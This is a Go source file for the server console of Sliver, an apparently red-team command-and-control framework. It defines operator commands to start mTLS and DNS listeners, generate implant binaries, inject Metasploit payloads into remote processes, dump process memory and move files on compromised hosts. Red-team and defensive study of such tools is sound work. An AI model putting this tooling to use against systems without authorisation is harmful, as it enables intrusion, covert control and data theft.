package console

import (
	"bufio"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	insecureRand "math/rand"
	"os"
	"path"
	"path/filepath"
	pb "sliver/protobuf/sliver"
	"strconv"
	"strings"
	"time"

	"github.com/desertbit/grumble"
	"github.com/fatih/color"

	"sliver/server/assets"
	"sliver/server/core"
	"sliver/server/generate"
	"sliver/server/help"
)

var (
	activeSliver *core.Sliver
	cmdTimeout   = 10 * time.Second
)

// Start - Starts the main server console
func Start() {

	sliverApp := grumble.New(&grumble.Config{
		Name:                  "sliver",
		Description:           "Bishop Fox - Sliver",
		HistoryFile:           path.Join(assets.GetRootAppDir(), "history"),
		Prompt:                getPrompt(),
		PromptColor:           color.New(),
		HelpHeadlineColor:     color.New(),
		HelpHeadlineUnderline: true,
		HelpSubCommands:       true,
	})
	sliverApp.SetPrintASCIILogo(printLogo)
	cmdInit(sliverApp)

	defer func() {

		// Cleanup "Jobs" i.e. listeners
		core.JobMutex.Lock()
		for ID, job := range *core.Jobs {
			job.JobCtrl <- true
			delete(*core.Jobs, ID)
		}
		core.JobMutex.Unlock()

		// Cleanup sliver connections
		for _, sliver := range *core.Hive.Slivers {
			core.Hive.RemoveSliver(sliver)
		}

		close(core.Events) // Cleanup eventLoop()
	}()

	go eventLoop(sliverApp, core.Events)

	err := sliverApp.Run()
	if err != nil {
		log.Printf("Run loop returned error: %v", err)
	}
}

func eventLoop(sliverApp *grumble.App, events chan core.Event) {
	stdout := bufio.NewWriter(os.Stdout)
	for event := range events {
		sliver := event.Sliver
		job := event.Job
		switch event.EventType {
		case "stopped":
			fmt.Printf(clearln+Warn+"Job #%d stopped (%s/%s)\n", job.ID, job.Protocol, job.Name)
		case "connected":
			fmt.Printf(clearln+Info+"Session #%d %s - %s (%s) - %s/%s\n",
				sliver.ID, sliver.Name, sliver.RemoteAddress, sliver.Hostname, sliver.Os, sliver.Arch)
		case "disconnected":
			fmt.Printf(clearln+Warn+"Lost session #%d %s - %s (%s) - %s/%s\n",
				sliver.ID, sliver.Name, sliver.RemoteAddress, sliver.Hostname, sliver.Os, sliver.Arch)
			if activeSliver != nil && sliver.ID == activeSliver.ID {
				activeSliver = nil
				sliverApp.SetPrompt(getPrompt())
				fmt.Printf(Warn + "Warning: Active sliver diconnected\n")
			}
		}
		fmt.Printf(getPrompt())
		stdout.Flush()
	}
}

func cmdInit(sliverApp *grumble.App) {

	// [ Multiplayer ] -----------------------------------------------------------------

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.NewPlayerStr,
		Help:     "Create a new player config file",
		LongHelp: help.GetHelpFor(help.NewPlayerStr),
		Flags: func(f *grumble.Flags) {
			f.String("o", "os", generate.WINDOWS, "operating system")
			f.String("a", "arch", "amd64", "cpu architecture")
			f.String("h", "lhost", "", "listen host")
			f.Int("l", "lport", 31337, "listen port")
			f.Bool("d", "debug", false, "enable debug features")
			f.String("s", "save", "", "directory/file to the binary to")
			f.String("n", "operator", "", "operator name")
		},
		Run: func(ctx *grumble.Context) error {
			newPlayerCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.ListPlayerStr,
		Help:     "List players connected to the server",
		LongHelp: help.GetHelpFor(help.ListPlayerStr),
		Run: func(ctx *grumble.Context) error {
			listPlayersCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.KickPlayerStr,
		Help:     "Kick a player from the server",
		LongHelp: help.GetHelpFor(help.KickPlayerStr),
		Flags: func(f *grumble.Flags) {
			f.String("o", "operator", "", "operator name")
		},
		Run: func(ctx *grumble.Context) error {
			kickPlayerCmd(ctx)
			return nil
		},
	})

	// [ Jobs ] -----------------------------------------------------------------

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.JobsStr,
		Help:     "Job control",
		LongHelp: help.GetHelpFor(help.JobsStr),
		Flags: func(f *grumble.Flags) {
			f.Int("k", "kill", -1, "kill a background job")
		},
		Run: func(ctx *grumble.Context) error {
			jobsCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.MtlsStr,
		Help:     "Start an mTLS listener",
		LongHelp: help.GetHelpFor(help.MtlsStr),
		Flags: func(f *grumble.Flags) {
			f.String("s", "server", "", "interface to bind server to")
			f.Int("l", "lport", 8888, "tcp listen port")
		},
		Run: func(ctx *grumble.Context) error {
			startMTLSListenerCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.DnsStr,
		Help:     "Start a DNS listener",
		LongHelp: help.GetHelpFor(help.DnsStr),
		Flags: func(f *grumble.Flags) {
			f.String("d", "domain", "", "parent domain to use for DNS C2")
		},
		Run: func(ctx *grumble.Context) error {
			startDNSListenerCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.MultiplayerModeStr,
		Help:     "Enable multiplayer mode",
		LongHelp: help.GetHelpFor(help.MultiplayerModeStr),
		Flags: func(f *grumble.Flags) {
			f.String("s", "server", "", "interface to bind server to")
			f.Int("l", "lport", 31337, "tcp listen port")
		},
		Run: func(ctx *grumble.Context) error {
			startMultiplayerModeCmd(ctx)
			return nil
		},
	})

	// [ Commands ] --------------------------------------------------------------

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.SessionsStr,
		Help:     "Session management",
		LongHelp: help.GetHelpFor(help.SessionsStr),
		Flags: func(f *grumble.Flags) {
			f.String("i", "interact", "", "interact with a sliver")
		},
		Run: func(ctx *grumble.Context) error {
			sessionsCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.BackgroundStr,
		Help:     "Background an active session",
		LongHelp: help.GetHelpFor(help.BackgroundStr),
		Run: func(ctx *grumble.Context) error {
			backgroundCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:      help.KillStr,
		Help:      "Kill a remote sliver process",
		LongHelp:  help.GetHelpFor(help.KillStr),
		AllowArgs: true,
		Run: func(ctx *grumble.Context) error {
			killCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:      help.InfoStr,
		Help:      "Get info about sliver",
		LongHelp:  help.GetHelpFor(help.InfoStr),
		AllowArgs: true,
		Run: func(ctx *grumble.Context) error {
			infoCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:      help.UseStr,
		Help:      "Switch the active sliver",
		LongHelp:  help.GetHelpFor(help.UseStr),
		AllowArgs: true,
		Run: func(ctx *grumble.Context) error {
			useCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.GenerateStr,
		Help:     "Generate a sliver binary",
		LongHelp: help.GetHelpFor(help.GenerateStr),
		Flags: func(f *grumble.Flags) {
			f.String("o", "os", generate.WINDOWS, "operating system")
			f.String("a", "arch", "amd64", "cpu architecture")
			f.String("h", "lhost", "", "listen host")
			f.Int("l", "lport", 8888, "listen port")
			f.Bool("d", "debug", false, "enable debug features")
			f.String("n", "dns", "", "dns c2 parent domain")
			f.String("s", "save", "", "directory/file to the binary to")
		},
		Run: func(ctx *grumble.Context) error {
			generateCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.MsfStr,
		Help:     "Execute a MSF payload",
		LongHelp: help.GetHelpFor(help.MsfStr),
		Flags: func(f *grumble.Flags) {
			f.String("m", "payload", "meterpreter_reverse_https", "msf payload")
			f.String("h", "lhost", "", "listen host")
			f.Int("l", "lport", 4444, "listen port")
			f.String("e", "encoder", "", "msf encoder")
			f.Int("i", "iterations", 1, "iterations of the encoder")
		},
		Run: func(ctx *grumble.Context) error {
			msfCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.InjectStr,
		Help:     "Inject a MSF payload",
		LongHelp: help.GetHelpFor(help.InjectStr),
		Flags: func(f *grumble.Flags) {
			f.Int("p", "pid", -1, "pid to inject into")
			f.String("m", "payload", "meterpreter_reverse_https", "msf payload")
			f.String("h", "lhost", "", "listen host")
			f.Int("l", "lport", 4444, "listen port")
			f.String("e", "encoder", "", "msf encoder")
			f.Int("i", "iterations", 1, "iterations of the encoder")
		},
		Run: func(ctx *grumble.Context) error {
			injectCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.PsStr,
		Help:     "List remote processes",
		LongHelp: help.GetHelpFor(help.PsStr),
		Flags: func(f *grumble.Flags) {
			f.Int("p", "pid", -1, "filter based on pid")
			f.String("e", "exe", "", "filter based on executable name")
			f.String("o", "owner", "", "filter based on owner")
		},
		Run: func(ctx *grumble.Context) error {
			psCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:      help.PingStr,
		Help:      "Test connection to sliver",
		LongHelp:  help.GetHelpFor(help.PingStr),
		AllowArgs: true,
		Run: func(ctx *grumble.Context) error {
			pingCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.GetPIDStr,
		Help:     "Get sliver pid",
		LongHelp: help.GetHelpFor(help.GetPIDStr),
		Run: func(ctx *grumble.Context) error {
			if activeSliver != nil {
				fmt.Printf("\n"+Info+"%d\n\n", activeSliver.PID)
			}
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.GetUIDStr,
		Help:     "Get sliver UID",
		LongHelp: help.GetHelpFor(help.GetUIDStr),
		Run: func(ctx *grumble.Context) error {
			if activeSliver != nil {
				fmt.Printf("\n"+Info+"%s\n\n", activeSliver.UID)
			}
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.GetGIDStr,
		Help:     "Get sliver GID",
		LongHelp: help.GetHelpFor(help.GetGIDStr),
		Run: func(ctx *grumble.Context) error {
			if activeSliver != nil {
				fmt.Printf("\n"+Info+"%s\n\n", activeSliver.GID)
			}
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.WhoamiStr,
		Help:     "Get sliver user",
		LongHelp: help.GetHelpFor(help.WhoamiStr),
		Run: func(ctx *grumble.Context) error {
			if activeSliver != nil {
				fmt.Printf("\n"+Info+"%s\n\n", activeSliver.Username)
			}
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.LsStr,
		Help:     "List current directory",
		LongHelp: help.GetHelpFor(help.LsStr),
		Run: func(ctx *grumble.Context) error {
			lsCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:      help.RmStr,
		Help:      "Remove a file or directory",
		LongHelp:  help.GetHelpFor(help.RmStr),
		AllowArgs: true,
		Run: func(ctx *grumble.Context) error {
			rmCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:      help.MkdirStr,
		Help:      "Make a directory",
		LongHelp:  help.GetHelpFor(help.MkdirStr),
		AllowArgs: true,
		Run: func(ctx *grumble.Context) error {
			mkdirCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:      help.CdStr,
		Help:      "Change directory",
		LongHelp:  help.GetHelpFor(help.CdStr),
		AllowArgs: true,
		Run: func(ctx *grumble.Context) error {
			cdCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:     help.PwdStr,
		Help:     "Print working directory",
		LongHelp: help.GetHelpFor(help.PwdStr),
		Run: func(ctx *grumble.Context) error {
			pwdCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:      help.CatStr,
		Help:      "Dump file to stdout",
		LongHelp:  help.GetHelpFor(help.CatStr),
		AllowArgs: true,
		Run: func(ctx *grumble.Context) error {
			catCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:      help.DownloadStr,
		Help:      "Download a file",
		LongHelp:  help.GetHelpFor(help.DownloadStr),
		AllowArgs: true,
		Run: func(ctx *grumble.Context) error {
			downloadCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:      help.UploadStr,
		Help:      "Upload a file",
		LongHelp:  help.GetHelpFor(help.UploadStr),
		AllowArgs: true,
		Run: func(ctx *grumble.Context) error {
			uploadCmd(ctx)
			return nil
		},
	})

	sliverApp.AddCommand(&grumble.Command{
		Name:      help.ProcdumpStr,
		Help:      "Dump process memory",
		LongHelp:  help.GetHelpFor(help.ProcdumpStr),
		AllowArgs: true,
		Run: func(ctx *grumble.Context) error {
			procdumpCmd(ctx)
			return nil
		},
	})

}

func localFileList(line string) []string {
	words := strings.Fields(line)
	if len(words) < 1 {
		return []string{}
	}
	prefix := filepath.Dir(words[len(words)-1])
	log.Printf("line = '%s', prefix = '%s'", line, prefix)
	names := make([]string, 0)
	files, _ := ioutil.ReadDir(prefix)
	for _, f := range files {
		absPath, err := filepath.Abs(path.Join(prefix, f.Name()))
		if err != nil {
			log.Printf("Error %v", err)
			continue
		}
		names = append(names, absPath)
	}
	return names
}

func getPrompt() string {
	prompt := underline + "sliver" + normal
	if activeSliver != nil {
		prompt += fmt.Sprintf(bold+red+" (%s)%s", activeSliver.Name, normal)
	}
	prompt += " > "
	return prompt
}

func getSliver(name string) *core.Sliver {
	id, err := strconv.Atoi(name)
	name = strings.ToUpper(name)
	if err == nil {
		if sliver, ok := (*core.Hive.Slivers)[id]; ok {
			return sliver
		}
	}
	for _, sliver := range *core.Hive.Slivers {
		if sliver.Name == name {
			return sliver
		}
	}
	return nil
}

// Sends a protobuf request to the active sliver and returns the response
func activeSliverRequest(msgType string, reqID string, data []byte) (*pb.Envelope, error) {
	if activeSliver == nil {
		return nil, errors.New("No active sliver")
	}
	resp := make(chan *pb.Envelope)
	(*activeSliver).Resp[reqID] = resp
	defer func() {
		activeSliver.RespMutex.Lock()
		defer activeSliver.RespMutex.Unlock()
		close(resp)
		delete((*activeSliver).Resp, reqID)
	}()
	(*activeSliver).Send <- &pb.Envelope{
		Id:   reqID,
		Type: msgType,
		Data: data,
	}

	var respEnvelope *pb.Envelope
	select {
	case respEnvelope = <-resp:
	case <-time.After(cmdTimeout):
		return nil, errors.New("timeout")
	}
	return respEnvelope, nil
}

func printLogo(sliverApp *grumble.App) {
	insecureRand.Seed(time.Now().Unix())
	logo := asciiLogos[insecureRand.Intn(len(asciiLogos))]
	fmt.Println(logo)
	fmt.Println(Info + "Welcome to the sliver shell, please type 'help' for options")
	fmt.Println()
}

var asciiLogos = []string{
	red + `
 	  ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███  
	▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
	░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
	  ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄  
	▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
	▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
	░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
	░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░ 
		  ░      ░  ░ ░        ░     ░  ░   ░     
` + normal,

	green + `
    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗ 
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
` + normal,
}
